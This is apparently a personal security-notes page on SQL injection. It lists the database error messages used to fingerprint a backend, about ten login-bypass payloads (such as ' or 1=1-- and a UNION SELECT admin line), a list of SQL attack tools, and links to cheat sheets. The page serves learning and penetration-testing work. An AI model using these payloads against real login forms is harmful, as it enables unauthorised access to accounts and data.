---
layout: default
title: SQLi
nav_order: 2 
parent: security stuff
permalink: /notes/security-stuff/sqli
---

1. TOC
{:toc}

## General info
There are four common database types: (each one will report errors in different ways)
1. MySQL
  - error example: `The used SELECT statements have a different number of columns`
2. MSSQL
  - error example: `All queries in an SQL statement containing a UNION operator must have an equal number of expressions in their target lists`
3. Oracle
  - error example: 
4. Postgre-SQL
  - error example: `Each UNION query must have the same number of columns`

---

## Injection (SQLi)
### Easy Injection Tests (aka Login Tricks)
 - `admin' --`  
 - `admin' #`  
 - `admin'/*`  
 - `' or 1=1--`  
 - `' or 1=1-- -`  
 - `' or 1=1#`  
 - `' or 1=1/*`  
 - `') or '1'='1--`  
 - `') or ('1'='1--`  
 - `'UNION SELECT 1, 'admin', 'password', 1--`  


### Automatic scanning with SQLMap

---

## Resources / More info
SQL Injection Hacking Tools

-    SQLDict – Performs a dictionary attack against the SQL server
-    SQLExec – Executes commands on a compromised SQL server
-    SQLbf – Another password cracking program that performs both dictionary and brute force attacks
-    SQLSmack – Linux based command shell program
-    SQL2.exe – This UDP buffer overflow attack will return a command prompt to the attacker
-    Msadc.pl – A SQL injection exploit
- [Wapiti](http://wapiti.sourceforge.net/)
- [http://securitytools.wikidot.com/sql-injection](http://securitytools.wikidot.com/sql-injection)
- [https://securiteam.com/securityreviews/5DP0N1P76E](https://securiteam.com/securityreviews/5DP0N1P76E)

### Links  
#### Cheatsheets and more 
[SQLi Cheat Sheet - netsparker](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)  
[SQLi Cheat Sheet - pentestmonkey](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
#### Good reads
[MSSQL Injection PWNage](https://www.exploit-db.com/papers/12975)
[Drupageddon](https://www.linuxjournal.com/content/drupageddon-sql-injection-database-abstraction-and-hundreds-thousands-web-sites)




